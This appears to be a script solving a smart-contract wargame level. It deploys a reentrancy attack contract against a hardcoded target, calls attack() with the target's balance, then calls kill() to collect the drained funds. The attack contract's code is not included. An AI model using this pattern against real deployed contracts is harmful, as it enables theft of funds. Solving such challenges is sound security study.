// Runtime Environment's members available in the global scope.
import { BigNumber, ethers, Signer } from "ethers";
import { Interface } from "ethers/lib/utils";
import { getSigner } from "./signer";
import { ReentranceAttack10__factory } from "../typechain";


async function main() {
  const instanceAddress = "0x857F2348Fabca348fd2046993017365b849ACE63";
  const signer = getSigner();
  console.log("deploy attack contract");
  const ct = await (new ReentranceAttack10__factory(signer)).deploy(instanceAddress);
  await ct.deployed();

  const balance = await signer.provider?.getBalance(instanceAddress) || BigNumber.from(0);
  console.log(`target balance: ${balance.toString()}`);
 

  console.log("attack contract");
  await (await ct.attack({gasLimit: 900000, value: balance})).wait();
  console.log("destroy contract to withdraw balances")
  await ct.kill();

  
  console.log(`target balance: ${(await signer.provider?.getBalance(instanceAddress) || "").toString()}`);
}

main()
  .then(() => {
    console.log("Done!");
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });

const abi = [
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "_to",
        "type": "address"
      }
    ],
    "name": "donate",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function",
    "payable": true,
    "signature": "0x00362a95"
  }
]